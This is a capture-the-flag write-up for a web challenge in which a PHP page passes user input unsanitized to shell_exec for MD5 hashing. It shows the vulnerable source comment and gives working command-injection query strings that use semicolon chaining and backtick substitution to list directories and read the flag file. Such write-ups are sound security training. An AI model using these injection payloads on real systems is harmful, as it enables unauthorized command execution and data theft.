Shiny Button Writeup
----------------------------------------------
So we start with a [web page](http://webchal.hax.works:1234/4efbc763384086cd91ce2c898110fd8d/index.php) that gives us some info about MD5 and a text box that hashes our input.

Brute forcing a hash seemed a little too outlandish for this competition so I did some basic enumeration.

A glance at the source code gave us our first hint:
```HTML
    <!--
    echo shell_exec('md5sum '.$_GET['string'].'');
    TODO: Fix shell script, md5 can't take standard input 
    -->
```

So, they are running the md5 through the shell_exec() command.

We know this is exploitable because it passes the $_GET['string'] variable directly without any sanitization -- a big mistake.

If we do some research on the md5sum command, we find out that it deoesn't read from stdin.. just like the comment said. So we can give it input one of two ways:
```bash
echo <string> | md5sum
md5sum <filename>
```
echoing the string into a pipe seems like the most obvious to me so I will do my testing with that.

I used [Postman](https://www.getpostman.com/downloads/) to craft and send my requests but anything will work, even typing directly into the address bar.

A request should look like the following:
```
http://webchal.hax.works:1234/4efbc763384086cd91ce2c898110fd8d/index.php?string=hash+me%21
```

For the remainder of the writeup, I will remove everything up to `string=`

I started by looking fuzzing for an exploit like follows:
```HTML
string=a';cat flag.txt
string=a;cat flag.txt 
```

Very quickly, we can tell that passing a `'` breaks the script and the second query returns:
```
    a
d41d8cd98f00b204e9800998ecf8427e  -
```

Whats happening is that `a` is being echoed and the string `cat flag.txt` is being passed to the md5sum command.
This commands that the server runs the command as:
```Bash
echo <input> | md5sum
```

So how can we exploit that?
```string=a;cat flag.txt;echo a``` 

The reason for the <cmd>;echo a is because we need to:
1. finish the echo command first
2. Run our command
3. feed some input (that is **not** the output of our command) into the md5 function

So the output gives us a blank line where the `cat flag.txt` output should go.
Lets try just a normal command rather than reading the flag:
```Bash
string=a;echo `ls`;echo a
```
The \`\` tell bash to evaluate whats between the ticks and feed the output to `echo`

The response works and we can see:
```
a
Cerulean_Cave index.php
60b725f10c9c85c70d97880dfe8191b3  -
```
Now we can make our command more consice by removing the `a;echo` part. We also need to enumerate the `Cerulean_Cave` directory:
```
string=`ls Cerulean_Cave`;echo a
```
There is a text file that we can now read out

SOLVE:
```HTML
string=`cat Cerulean_Cave/MewTwo.txt`;echo a
```
